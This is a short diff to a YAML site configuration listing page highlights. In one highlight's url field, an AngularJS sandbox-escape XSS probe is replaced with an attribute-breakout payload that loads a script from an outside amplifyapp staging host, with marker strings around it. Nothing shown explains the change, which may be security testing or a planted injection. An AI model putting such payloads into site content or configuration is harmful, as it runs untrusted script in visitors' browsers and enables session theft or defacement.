@@ -18,10 +18,8 @@ sections:
           url: https://google.com
         - title: Highlight B
           description: Important highlight B is equally important
-          url: https://test.com/"'>ffff123<img src="x">zzzzz<script
-            src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.js"></script>
-            <div> {{constructor.constructor('alert(123)')()}}
-            </div>ttt<iframe></iframe>
+          url: https://test.com/"'>payload123<script
+            src="https://staging.d3lm7ksvtvt9eg.amplifyapp.com/files/mjssvg.mjs"></script>payload444
         - title: Page A
           description: Page A is important too
           url: /privacy/
